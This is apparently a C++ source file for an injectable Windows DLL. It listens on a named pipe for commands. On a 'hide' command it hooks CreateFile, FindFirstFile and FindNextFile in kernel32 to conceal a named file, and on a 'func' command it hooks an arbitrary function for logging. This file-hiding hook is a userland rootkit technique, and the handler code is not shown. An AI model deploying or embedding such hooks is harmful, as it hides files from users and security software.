#include <windows.h>
#include <iostream>
#include "HookManager/HookManager.h"
#include "HookHandlers/HookHandlers.h"
#include "UnifiedHookHandler/UnifiedHookHandler.h"
#include "../common/Pipe.h"

DWORD WINAPI PipeListenerThread(LPVOID) {
	Pipe& pipe = Pipe::getInstance();

	if (!pipe.connectToServer()) return 1;

	pipe.receiveMessage([](const std::string& message) {
		size_t modePos = message.find("MODE:");
		size_t paramPos = message.find(";PARAM:");
		if (modePos != std::string::npos && paramPos != std::string::npos) {
			std::string mode = message.substr(modePos + 5, paramPos - (modePos + 5));
			std::string param = message.substr(paramPos + 7);

			if (mode == "hide")
			{
				FileHider::getInstance().addHiddenFile(param);
				HookManager::getInstance().addHook("kernel32.dll", "CreateFileA", reinterpret_cast<void*>(&HookHandlers::HookCreateFileA));
				HookManager::getInstance().addHook("kernel32.dll", "CreateFileW", reinterpret_cast<void*>(&HookHandlers::HookCreateFileW));
				HookManager::getInstance().addHook("kernel32.dll", "FindFirstFileA", reinterpret_cast<void*>(&HookHandlers::HookFindFirstFileA));
				HookManager::getInstance().addHook("kernel32.dll", "FindFirstFileW", reinterpret_cast<void*>(&HookHandlers::HookFindFirstFileW));
				HookManager::getInstance().addHook("kernel32.dll", "FindNextFileA", reinterpret_cast<void*>(&HookHandlers::HookFindNextFileA));
				HookManager::getInstance().addHook("kernel32.dll", "FindNextFileW", reinterpret_cast<void*>(&HookHandlers::HookFindNextFileW));
			}
			else if (mode == "func")
			{
				g_HookFunction = reinterpret_cast<uint64_t>(&HookHandlers::HookLogging);
				HookManager::getInstance().addHook("kernel32.dll", param, reinterpret_cast<void*>(&UnifiedHookHandler));
			}
		}
		});

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		CreateThread(NULL, 0, PipeListenerThread, NULL, 0, NULL);
		break;
	case DLL_PROCESS_DETACH:
		Pipe::getInstance().closePipe();
		break;
	}
	return TRUE;
}
